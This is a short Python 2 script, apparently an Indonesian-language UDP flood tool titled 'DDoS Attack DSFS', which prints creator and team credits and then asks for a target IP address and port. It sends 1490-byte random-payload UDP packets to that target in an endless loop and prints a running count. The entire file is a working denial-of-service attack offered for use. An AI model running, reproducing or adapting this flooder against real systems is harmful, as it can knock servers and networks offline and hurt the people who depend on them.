import sys
import os
import time
import socket
import random
#Perlengkapan Tempur :v
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDoS Attack DSFS")
print
print "Creator   : Anon6372098"
print "You Tube  : https://www.youtube.com/channel/UC6z-i5NX934RvX7BWr3MlJw (D4RK SYST3M F41LUR3 S33K3R)"
print "Github    : https://github.com/Anon6372098"
print "Email     : anon6372098@gmail.com"
print "Team.     : D4RK SYST3M F41LUR3 S33K3R (DSFS)"
print
ip = raw_input("Masukkan IP Target : ")
port = input("Masukkan Port      : ")

os.system("clear")
os.system("figlet Dimulai")
sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 0
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 0
